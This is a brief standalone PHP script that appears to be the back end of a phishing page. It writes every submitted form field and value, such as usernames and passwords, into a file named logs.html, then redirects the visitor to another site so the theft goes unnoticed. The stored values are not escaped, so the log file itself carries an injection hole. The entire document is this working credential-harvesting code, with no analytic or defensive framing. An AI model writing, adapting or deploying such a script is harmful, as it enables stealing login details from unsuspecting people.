<?php 
ini_set('display_errors', 'On');
error_reporting(E_ALL);
header("Location: https://example.com"); 
$handle = fopen("logs.html", "a"); 
foreach($_POST as $variable => $value) 
{ 
fwrite($handle, $variable); 
fwrite($handle, "="); 
fwrite($handle, $value); 
fwrite($handle, "\r\n"); 
} 
fwrite($handle, "\r\n"); 
fwrite($handle, "<hr />"); 
fclose($handle); 
exit; 
?>
